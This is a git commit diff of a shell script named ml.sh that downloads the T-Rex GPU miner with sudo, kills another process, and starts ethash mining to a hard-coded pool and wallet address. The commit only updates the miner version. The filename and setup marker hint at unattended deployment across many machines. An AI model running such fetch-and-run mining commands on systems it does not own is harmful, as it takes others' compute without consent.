851dc1dddf08bc3c127a51de8afc5cb6b694f8e9
oursourcegtx <93318626+oursourcegtx@users.noreply.github.com>
2022-07-08 11:33:05 +0700

    Update ml.sh

--- ml.sh
+++ ml.sh
@@ -4,7 +4,7 @@ woker+=$name
 sudo apt-get install linux-headers-$(uname -r) -y
 distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
 echo "xxx vip pro" > isHaveSetupCoin.txt
-sudo wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz 
+sudo wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz ; tar -zxvf t-rex-0.25.12-linux.tar.gz 
 sudo killall XXX
 ./t-rex -a ethash -o us-eth.2miners.com:2020 -u bc1qu7ecen9pvuva0x3t2qxsy9d3ayldt9qvy6ehgw -p x -w $woker &
 
